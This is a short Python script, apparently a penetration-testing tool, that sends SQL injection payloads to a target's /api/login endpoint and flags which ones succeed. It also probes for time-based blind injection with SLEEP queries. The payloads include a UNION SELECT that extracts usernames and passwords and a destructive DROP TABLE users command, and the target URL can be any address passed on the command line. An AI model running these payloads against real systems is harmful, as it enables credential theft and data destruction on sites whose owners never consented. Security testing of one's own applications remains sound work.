import requests
import sys

def test_sql_injection(target_url):
    payloads = [
        "' OR '1'='1",
        "' UNION SELECT username, password FROM users--",
        "'; DROP TABLE users;--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'x'='x"
    ]
    
    print(f"[+] Testing SQL Injection on {target_url}")
    
    for payload in payloads:
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(f"{target_url}/api/login", json=data, timeout=5)
            
            if response.status_code == 200:
                print(f"[!] VULNERABLE: {payload}")
                print(f"    Response: {response.text[:100]}")
            else:
                print(f"[-] Blocked: {payload}")
                
        except Exception as e:
            print(f"[!] Error with {payload}: {e}")

def test_blind_sqli(target_url):
    print(f"[+] Testing Blind SQL Injection")
    
    # Time-based blind SQLi
    time_payloads = [
        "admin' AND (SELECT SLEEP(5))--",
        "' OR IF(1=1, SLEEP(5), 0)--"
    ]
    
    for payload in time_payloads:
        try:
            import time
            start_time = time.time()
            data = {"username": payload, "password": "test"}
            response = requests.post(f"{target_url}/api/login", json=data, timeout=10)
            end_time = time.time()
            
            if end_time - start_time > 4:
                print(f"[!] TIME-BASED SQLi FOUND: {payload}")
            else:
                print(f"[-] No delay: {payload}")
                
        except Exception as e:
            print(f"[!] Error: {e}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    test_sql_injection(target)
    test_blind_sqli(target)